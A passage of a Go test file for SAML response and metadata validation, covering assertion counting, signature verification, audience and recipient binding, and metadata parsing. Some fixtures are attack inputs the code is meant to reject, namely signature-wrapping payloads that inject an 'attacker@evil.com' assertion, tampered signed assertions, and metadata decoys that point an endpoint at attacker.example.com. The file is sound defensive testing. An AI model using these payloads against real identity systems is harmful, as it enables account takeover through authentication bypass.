			` + assertionContent + `
		</saml:Assertion>
	</samlp:Response>`
}

func m1SignResponse(t *testing.T, xml string, assertion bool) string {
	t.Helper()
	o := samlify.SignatureOptions{PrivateKey: m1TestPrivateKey, SignatureAlgorithm: m1TestSignatureAlgorithm,
		SigningCert: samlify.NormalizeCerString(m1TestCertificate), AfterLocalName: "Issuer"}
	if assertion {
		o.ReferenceLocalPath = []string{"Response", "Assertion"}
	}
	out, err := samlify.ConstructSAMLSignature(xml, o)
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func m1AssertionMeta(t *testing.T) *samlify.Metadata {
	t.Helper()
	idp, err := samlify.IdentityProvider(samlify.Setting{EntityID: "https://idp.example.com", SigningCert: []string{m1TestCertificate},
		SingleSignOnService: []samlify.Service{{Binding: "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect", Location: "https://idp.example.com/sso"}}})
	if err != nil {
		t.Fatal(err)
	}
	return idp.Meta
}

func m1Encode(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

func m1WrapEvery(s string, n int, sep string) string {
	var b strings.Builder
	for len(s) >= n {
		b.WriteString(s[:n])
		b.WriteString(sep)
		s = s[n:]
	}
	b.WriteString(s)
	return b.String()
}

func TestMiscSAMLAssertions(t *testing.T) {
	t.Run("validateSingleAssertion", func(t *testing.T) {
		t.Run("valid responses (exactly 1 assertion)", func(t *testing.T) {
			t.Run("should accept response with single assertion", func(t *testing.T) {
				m1ExpectNoErr(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<saml:Assertion ID="123">
						<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
					</saml:Assertion>
				</samlp:Response>
			`)))
			})
			t.Run("should accept response with single encrypted assertion", func(t *testing.T) {
				m1ExpectNoErr(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<saml:EncryptedAssertion>
						<xenc:EncryptedData>...</xenc:EncryptedData>
					</saml:EncryptedAssertion>
				</samlp:Response>
			`)))
			})
		})

		t.Run("base64 whitespace handling", func(t *testing.T) {
			t.Run("should accept base64 with embedded whitespace from line-wrapping IDPs", func(t *testing.T) {
				b64 := m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<saml:Assertion ID="123">
						<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
					</saml:Assertion>
				</samlp:Response>
			`)
				lf := m1WrapEvery(b64, 76, "\n")
				crlf := m1WrapEvery(b64, 76, "\r\n")
				st := m1WrapEvery(b64, 20, " \t ")
				if !strings.Contains(lf, "\n") || !strings.Contains(crlf, "\r\n") || !strings.Contains(st, " \t ") {
					t.Fatal("wrapping failed")
				}
				m1ExpectNoErr(t, validateSingleAssertion(lf))
				m1ExpectNoErr(t, validateSingleAssertion(crlf))
				m1ExpectNoErr(t, validateSingleAssertion(st))
			})
		})

		t.Run("no assertions", func(t *testing.T) {
			t.Run("should reject response with no assertions", func(t *testing.T) {
				m1ExpectErrContains(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
					<samlp:Status>
						<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
					</samlp:Status>
				</samlp:Response>
			`)), "SAML response contains no assertions")
			})
		})

		two := "SAML response contains 2 assertions, expected exactly 1"
		t.Run("multiple assertions", func(t *testing.T) {
			t.Run("should reject response with multiple unencrypted assertions", func(t *testing.T) {
				m1ExpectErrContains(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<saml:Assertion ID="assertion1">
						<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
					</saml:Assertion>
					<saml:Assertion ID="assertion2">
						<saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
					</saml:Assertion>
				</samlp:Response>
			`)), two)
			})
			t.Run("should reject response with multiple encrypted assertions", func(t *testing.T) {
				m1ExpectErrContains(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<saml:EncryptedAssertion>
						<xenc:EncryptedData>...</xenc:EncryptedData>
					</saml:EncryptedAssertion>
					<saml:EncryptedAssertion>
						<xenc:EncryptedData>...</xenc:EncryptedData>
					</saml:EncryptedAssertion>
				</samlp:Response>
			`)), two)
			})
			t.Run("should reject response with mixed assertion types", func(t *testing.T) {
				m1ExpectErrContains(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<saml:Assertion ID="plain-assertion">
						<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
					</saml:Assertion>
					<saml:EncryptedAssertion>
						<xenc:EncryptedData>...</xenc:EncryptedData>
					</saml:EncryptedAssertion>
				</samlp:Response>
			`)), two)
			})
		})

		t.Run("XSW attack patterns", func(t *testing.T) {
			t.Run("should reject assertion injected in Extensions element", func(t *testing.T) {
				m1ExpectErrContains(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<samlp:Extensions>
						<saml:Assertion ID="injected-assertion">
							<saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
						</saml:Assertion>
					</samlp:Extensions>
					<saml:Assertion ID="legitimate-assertion">
						<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
					</saml:Assertion>
				</samlp:Response>
			`)), two)
			})
			t.Run("should reject assertion wrapped in arbitrary element", func(t *testing.T) {
				m1ExpectErrContains(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<Wrapper>
						<saml:Assertion ID="wrapped-assertion">
							<saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
						</saml:Assertion>
					</Wrapper>
					<saml:Assertion ID="legitimate-assertion">
						<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
					</saml:Assertion>
				</samlp:Response>
			`)), two)
			})
			t.Run("should reject deeply nested injected assertion", func(t *testing.T) {
				m1ExpectErrContains(t, validateSingleAssertion(m1Encode(`
				<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
					<Level1>
						<Level2>
							<Level3>
								<saml:Assertion ID="deep-injected">
									<saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
								</saml:Assertion>
							</Level3>
						</Level2>
					</Level1>
					<saml:Assertion ID="legitimate-assertion">
						<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
					</saml:Assertion>
				</samlp:Response>
			`)), two)
			})
		})

		t.Run("namespace handling", func(t *testing.T) {
			t.Run("should handle assertion without namespace prefix", func(t *testing.T) {
				m1ExpectNoErr(t, validateSingleAssertion(m1Encode(`
				<Response>
					<Assertion ID="123">
						<Subject><NameID>user@example.com</NameID></Subject>
					</Assertion>
				</Response>
			`)))
			})
			t.Run("should handle assertion with saml2: prefix", func(t *testing.T) {
				m1ExpectNoErr(t, validateSingleAssertion(m1Encode(`
				<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">
					<saml2:Assertion ID="123">
						<saml2:Subject><saml2:NameID>user@example.com</saml2:NameID></saml2:Subject>
					</saml2:Assertion>
				</saml2p:Response>
			`)))
			})
			t.Run("should handle assertion with custom prefix", func(t *testing.T) {
				m1ExpectNoErr(t, validateSingleAssertion(m1Encode(`
				<custom:Response xmlns:custom="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:myprefix="urn:oasis:names:tc:SAML:2.0:assertion">
					<myprefix:Assertion ID="123">
						<myprefix:Subject><myprefix:NameID>user@example.com</myprefix:NameID></myprefix:Subject>
					</myprefix:Assertion>
				</custom:Response>
			`)))
			})
		})
	})

	t.Run("verifySAMLAssertionSignature", func(t *testing.T) {
		meta := m1AssertionMeta(t)
		required := "SAML assertion signature is required"

		t.Run("accepts a cryptographically signed assertion", func(t *testing.T) {
			m1ExpectNoErr(t, verifySAMLAssertionSignature(m1SignResponse(t, m1CreateUnsignedResponse(""), true), meta))
		})
		t.Run("accepts a signed assertion when the response is also signed", func(t *testing.T) {
			both := m1SignResponse(t, m1SignResponse(t, m1CreateUnsignedResponse(""), true), false)
			m1ExpectNoErr(t, verifySAMLAssertionSignature(both, meta))
		})
		t.Run("rejects a response-only signature", func(t *testing.T) {
			m1ExpectErrContains(t, verifySAMLAssertionSignature(m1SignResponse(t, m1CreateUnsignedResponse(""), false), meta), required)
		})
		t.Run("rejects a response signature plus a non-XMLDSig assertion decoy", func(t *testing.T) {
			r := m1SignResponse(t, m1CreateUnsignedResponse(`<fake:Signature xmlns:fake="urn:example:fake" />`), false)
			m1ExpectErrContains(t, verifySAMLAssertionSignature(r, meta), required)
		})
		t.Run("accepts a validly signed assertion despite a foreign-namespace decoy at the response level", func(t *testing.T) {
			r := m1SignResponse(t, m1CreateUnsignedResponse(""), true)
			if !strings.Contains(r, "</saml:Assertion>") {
				t.Fatalf("signed response lacks </saml:Assertion>: %s", r)
			}
			withDecoy := strings.Replace(r, "</saml:Assertion>", `</saml:Assertion><fake:Signature xmlns:fake="urn:example:fake" />`, 1)
			m1ExpectNoErr(t, verifySAMLAssertionSignature(withDecoy, meta))
		})
		t.Run("rejects a tampered signed assertion", func(t *testing.T) {
			r := m1SignResponse(t, m1CreateUnsignedResponse("<saml:Subject>original</saml:Subject>"), true)
			if !strings.Contains(r, ">original<") {
				t.Fatalf("signed response lacks >original<: %s", r)
			}
			r = strings.Replace(r, ">original<", ">tampered<", 1)
			m1ExpectErrContains(t, verifySAMLAssertionSignature(r, meta), required)
		})
		t.Run("accepts a signed assertion after encrypted transport is decrypted", func(t *testing.T) {
			sp, err := samlify.ServiceProvider(samlify.Setting{EntityID: "https://service.example.com/saml",
				AssertionConsumerService: []samlify.Service{{Binding: "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST", Location: "https://service.example.com/saml/acs"}},
				EncryptCert:              []string{m1TestCertificate}, EncPrivateKey: m1TestPrivateKey, IsAssertionEncrypted: true})
			m1ExpectNoErr(t, err)
			idp, err := samlify.IdentityProvider(samlify.Setting{EntityID: "https://idp.example.com", SigningCert: []string{m1TestCertificate},
				IsAssertionEncrypted: true,
				SingleSignOnService:  []samlify.Service{{Binding: "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect", Location: "https://idp.example.com/sso"}}})
			m1ExpectNoErr(t, err)
			signed := m1SignResponse(t, m1CreateUnsignedResponse(""), true)
			encrypted, err := samlify.EncryptAssertion(idp, sp, signed)
			m1ExpectNoErr(t, err)
			raw, err := base64.StdEncoding.DecodeString(encrypted)
			m1ExpectNoErr(t, err)
			decrypted, _, err := samlify.DecryptAssertion(sp, string(raw))
			m1ExpectNoErr(t, err)
			m1ExpectNoErr(t, verifySAMLAssertionSignature(decrypted, meta))
			if !strings.Contains(decrypted, "<saml:Subject/>") {
				t.Fatalf("decrypted document lacks <saml:Subject/>: %s", decrypted)
			}
			tampered := strings.Replace(decrypted, "<saml:Subject/>", "<saml:Subject>tampered</saml:Subject>", 1)
			m1ExpectErrContains(t, verifySAMLAssertionSignature(tampered, meta), required)
		})
	})

	t.Run("countAssertions", func(t *testing.T) {
		t.Run("should return separate counts for assertions and encrypted assertions", func(t *testing.T) {
			c, err := countAssertions(`
			<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
				<saml:Assertion ID="plain">
					<saml:Subject><saml:NameID>user@example.com</saml:NameID></saml:Subject>
				</saml:Assertion>
				<saml:EncryptedAssertion>
					<xenc:EncryptedData>...</xenc:EncryptedData>
				</saml:EncryptedAssertion>
			</samlp:Response>
		`)
			m1ExpectNoErr(t, err)
			if c.Assertions != 1 || c.EncryptedAssertions != 1 || c.Total != 2 {
				t.Fatalf("counts %+v", c)
			}
		})
		t.Run("should not count AssertionConsumerService as assertion", func(t *testing.T) {
			c, err := countAssertions(`
			<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata">
				<md:SPSSODescriptor>
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="http://example.com/acs"/>
				</md:SPSSODescriptor>
			</md:EntityDescriptor>
		`)
			m1ExpectNoErr(t, err)
			if c.Assertions != 0 || c.Total != 0 {
				t.Fatalf("counts %+v", c)
			}
		})
	})

	t.Run("error handling", func(t *testing.T) {
		t.Run("should reject invalid base64 input", func(t *testing.T) {
			m1ExpectErrContains(t, validateSingleAssertion("not-valid-base64!!!"), "Invalid base64-encoded SAML response")
		})
		t.Run("should reject non-XML content", func(t *testing.T) {
			m1ExpectErrContains(t, validateSingleAssertion(m1Encode("this is not xml at all")), "Invalid base64-encoded SAML response")
		})
	})
}

// ---- saml/response-binding.test.ts ----

const (
	m1SPEntityID   = "https://sp.example.com/metadata"
	m1SPAcsURL     = "https://sp.example.com/sso/acs"
	m1OtherSP      = "https://other.example.com/metadata"
	m1BindingUnset = "\x00unset"
)

func m1BuildAudienceRestrictions(groups [][]string) string {
	var b strings.Builder
	for _, g := range groups {
		b.WriteString("\n\t\t\t\t<saml:AudienceRestriction>\n\t\t\t\t\t")
		for _, a := range g {
			b.WriteString("<saml:Audience>" + a + "</saml:Audience>")
		}
		b.WriteString("\n\t\t\t\t</saml:AudienceRestriction>\n\t\t\t")
	}
	return b.String()
}

// m1BuildSAMLResponse mirrors buildSAMLResponse; m1BindingUnset keeps the default and ""
// omits the attribute (null upstream).
func m1BuildSAMLResponse(groups [][]string, destination, recipient string) string {
	if groups == nil {
		groups = [][]string{{m1SPEntityID}}
	}
	if destination == m1BindingUnset {
		destination = m1SPAcsURL
	}
	if recipient == m1BindingUnset {
		recipient = m1SPAcsURL
	}
	destAttr, recAttr := "", ""
	if destination != "" {
		destAttr = ` Destination="` + destination + `"`
	}
	if recipient != "" {
		recAttr = ` Recipient="` + recipient + `"`
	}
	return `
		<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"` + destAttr + `>
			<saml:Assertion>
				<saml:Subject>
					<saml:NameID>user@example.com</saml:NameID>
					<saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
						<saml:SubjectConfirmationData` + recAttr + ` NotOnOrAfter="2030-01-01T00:00:00.000Z" />
					</saml:SubjectConfirmation>
				</saml:Subject>
				<saml:Conditions>
					` + m1BuildAudienceRestrictions(groups) + `
				</saml:Conditions>
			</saml:Assertion>
		</samlp:Response>
	`
}

func m1ValidateBinding(xml string, audiences ...string) error {
	if len(audiences) == 0 {
		audiences = []string{m1SPEntityID}
	}
	return validateSAMLResponseBinding(xml, audiences, []string{m1SPAcsURL})
}

func TestMiscSAMLResponseBinding(t *testing.T) {
	u := m1BindingUnset
	t.Run("validateSAMLResponseBinding", func(t *testing.T) {
		t.Run("accepts an assertion addressed to this Service Provider", func(t *testing.T) {
			m1ExpectNoErr(t, m1ValidateBinding(m1BuildSAMLResponse(nil, u, u)))
		})
		t.Run("accepts an explicitly configured audience alias", func(t *testing.T) {
			alias := "https://app.example.com/saml"
			m1ExpectNoErr(t, m1ValidateBinding(m1BuildSAMLResponse([][]string{{alias}}, u, u), m1SPEntityID, alias))
		})
		t.Run("accepts multiple audiences in one AudienceRestriction when one matches", func(t *testing.T) {
			m1ExpectNoErr(t, m1ValidateBinding(m1BuildSAMLResponse([][]string{{m1OtherSP, m1SPEntityID}}, u, u)))
		})
		t.Run("rejects an assertion with no AudienceRestriction", func(t *testing.T) {
			m1ExpectErrMatch(t, m1ValidateBinding(m1BuildSAMLResponse([][]string{}, u, u)), `missing an AudienceRestriction`)
		})
		t.Run("rejects an assertion whose AudienceRestriction does not include this Service Provider", func(t *testing.T) {
			m1ExpectErrMatch(t, m1ValidateBinding(m1BuildSAMLResponse([][]string{{m1OtherSP}}, u, u)), `audience does not match`)
		})
		t.Run("rejects multiple AudienceRestriction conditions unless every condition matches", func(t *testing.T) {
			m1ExpectErrMatch(t, m1ValidateBinding(m1BuildSAMLResponse([][]string{{m1SPEntityID}, {m1OtherSP}}, u, u)), `audience does not match`)
		})
		t.Run("rejects a bearer confirmation without Recipient", func(t *testing.T) {
			m1ExpectErrMatch(t, m1ValidateBinding(m1BuildSAMLResponse(nil, u, "")), `missing a Recipient`)
		})
		t.Run("rejects a bearer Recipient for another Service Provider", func(t *testing.T) {
			m1ExpectErrMatch(t, m1ValidateBinding(m1BuildSAMLResponse(nil, u, "https://other.example.com/sso/acs")), `Recipient does not match`)
		})
		t.Run("rejects a response Destination for another Service Provider", func(t *testing.T) {
			m1ExpectErrMatch(t, m1ValidateBinding(m1BuildSAMLResponse(nil, "https://other.example.com/sso/acs", u)), `Destination does not match`)
		})
		t.Run("accepts a response without Destination", func(t *testing.T) {
			m1ExpectNoErr(t, m1ValidateBinding(m1BuildSAMLResponse(nil, "", u)))
		})
	})

	t.Run("getSAMLPostAssertionConsumerServiceUrls", func(t *testing.T) {
		t.Run("extracts only POST AssertionConsumerService locations from SP metadata", func(t *testing.T) {
			got := getSAMLPostAssertionConsumerServiceURLs(`
			<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
				<md:SPSSODescriptor WantAssertionsSigned="false">
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="https://sp.example.com/saml/redirect" />
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
				</md:SPSSODescriptor>
			</md:EntityDescriptor>
		`)
			if !reflect.DeepEqual(got, []string{"https://sp.example.com/saml/post"}) {
				t.Fatalf("got %v", got)
			}
		})
		t.Run("returns no locations for empty or invalid metadata", func(t *testing.T) {
			if got := getSAMLPostAssertionConsumerServiceURLs(""); len(got) != 0 {
				t.Fatalf("got %v", got)
			}
			if got := getSAMLPostAssertionConsumerServiceURLs("<"); len(got) != 0 {
				t.Fatalf("got %v", got)
			}
		})
		t.Run("rejects a mixed foreign-namespace POST endpoint decoy", func(t *testing.T) {
			md := `
			<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:foreign="urn:example:foreign" entityID="https://sp.example.com/metadata">
				<md:SPSSODescriptor WantAssertionsSigned="false">
					<foreign:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://attacker.example.com/saml/post" />
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
				</md:SPSSODescriptor>
			</md:EntityDescriptor>
		`
			if _, err := parseSAMLServiceProviderMetadata(md); err == nil {
				t.Fatal("expected parse error")
			}
			if got := getSAMLPostAssertionConsumerServiceURLs(md); len(got) != 0 {
				t.Fatalf("got %v", got)
			}
		})
	})

	t.Run("parseSAMLServiceProviderMetadata", func(t *testing.T) {
		for _, c := range []struct {
			value    string
			expected bool
		}{{"true", true}, {"1", true}, {"false", false}, {"0", false}} {
			t.Run("parses XML Schema boolean "+c.value, func(t *testing.T) {
				got, err := parseSAMLServiceProviderMetadata(`
			<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
				<md:SPSSODescriptor WantAssertionsSigned="` + c.value + `">
					<md:NameIDFormat>urn:example:name-id</md:NameIDFormat>
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
				</md:SPSSODescriptor>
			</md:EntityDescriptor>
		`)
				m1ExpectNoErr(t, err)
				want := &parsedSPMetadata{EntityID: "https://sp.example.com/metadata", NameIDFormats: []string{"urn:example:name-id"},
					PostAssertionConsumerServiceURLs: []string{"https://sp.example.com/saml/post"}, WantAssertionsSigned: c.expected}
				if !reflect.DeepEqual(got, want) {
					t.Fatalf("got %+v, want %+v", got, want)
				}
			})
		}

		rejects := []struct{ desc, metadata string }{
			{"an invalid boolean", `
				<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
					<md:SPSSODescriptor WantAssertionsSigned="TRUE">
						<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
					</md:SPSSODescriptor>
				</md:EntityDescriptor>
			`},
			{"an unqualified tree", `
				<EntityDescriptor entityID="https://sp.example.com/metadata">
					<SPSSODescriptor WantAssertionsSigned="true">
						<AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
					</SPSSODescriptor>
				</EntityDescriptor>
			`},
			{"a foreign root around a metadata decoy", `
				<foreign:EntityDescriptor xmlns:foreign="urn:example:foreign" xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
					<md:EntityDescriptor entityID="https://sp.example.com/metadata">
						<md:SPSSODescriptor WantAssertionsSigned="true">
							<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
						</md:SPSSODescriptor>
					</md:EntityDescriptor>
				</foreign:EntityDescriptor>
			`},
			{"a foreign service-provider descriptor", `
				<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:foreign="urn:example:foreign" entityID="https://sp.example.com/metadata">
					<foreign:SPSSODescriptor WantAssertionsSigned="true">
						<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
					</foreign:SPSSODescriptor>
				</md:EntityDescriptor>
			`},
			{"a valid descriptor mixed with a later foreign descriptor", `
				<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:foreign="urn:example:foreign" entityID="https://sp.example.com/metadata">
					<md:SPSSODescriptor WantAssertionsSigned="false">
						<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
					</md:SPSSODescriptor>
					<foreign:SPSSODescriptor WantAssertionsSigned="false">
						<foreign:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://attacker.example.com/saml/post" />
					</foreign:SPSSODescriptor>
				</md:EntityDescriptor>
			`},
			{"a foreign NameIDFormat before a valid NameIDFormat", `
				<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" xmlns:foreign="urn:example:foreign" entityID="https://sp.example.com/metadata">
					<md:SPSSODescriptor WantAssertionsSigned="false">
						<foreign:NameIDFormat>urn:example:attacker</foreign:NameIDFormat>
						<md:NameIDFormat>urn:example:valid</md:NameIDFormat>
						<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post" />
					</md:SPSSODescriptor>
				</md:EntityDescriptor>
			`},
			{"no SPSSODescriptor", `
				<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata" />
			`},
			{"a POST AssertionConsumerService Location containing a fragment", `
				<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
					<md:SPSSODescriptor WantAssertionsSigned="false">
						<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post#fragment" />
					</md:SPSSODescriptor>
				</md:EntityDescriptor>
			`},
			{"a POST AssertionConsumerService Location ending in a lone fragment marker", `
				<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
					<md:SPSSODescriptor WantAssertionsSigned="false">
						<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/post#" />
					</md:SPSSODescriptor>
				</md:EntityDescriptor>
			`},
		}
		for _, c := range rejects {
			t.Run("rejects metadata with "+c.desc, func(t *testing.T) {
				if _, err := parseSAMLServiceProviderMetadata(c.metadata); err == nil {
					t.Fatal("expected error")
				}
			})
		}

		t.Run("accepts and aggregates multiple standard SPSSODescriptor elements", func(t *testing.T) {
			got, err := parseSAMLServiceProviderMetadata(`
			<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://sp.example.com/metadata">
				<md:SPSSODescriptor WantAssertionsSigned="false">
					<md:NameIDFormat>urn:example:name-id:legacy</md:NameIDFormat>
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/legacy-acs" />
				</md:SPSSODescriptor>
				<md:SPSSODescriptor WantAssertionsSigned="true">
					<md:NameIDFormat>urn:example:name-id:current</md:NameIDFormat>
					<md:AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="https://sp.example.com/saml/current-acs" />
				</md:SPSSODescriptor>
			</md:EntityDescriptor>
		`)
			m1ExpectNoErr(t, err)
			want := &parsedSPMetadata{EntityID: "https://sp.example.com/metadata",
				NameIDFormats:                    []string{"urn:example:name-id:legacy", "urn:example:name-id:current"},
				PostAssertionConsumerServiceURLs: []string{"https://sp.example.com/saml/legacy-acs", "https://sp.example.com/saml/current-acs"},
				WantAssertionsSigned:             true}
			if !reflect.DeepEqual(got, want) {
				t.Fatalf("got %+v, want %+v", got, want)
			}
		})
	})

	t.Run("hasSAMLEncryptedAssertion", func(t *testing.T) {
		t.Run("detects encrypted assertions without treating plain assertions as encrypted", func(t *testing.T) {
			enc := `
			<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
				<saml:EncryptedAssertion />
			</samlp:Response>
		`
			if !hasSAMLEncryptedAssertion(enc) {
				t.Fatal("encrypted response not detected")
			}
			if hasSAMLEncryptedAssertion(m1BuildSAMLResponse(nil, m1BindingUnset, m1BindingUnset)) {
				t.Fatal("plain response detected as encrypted")
			}
		})
	})
}
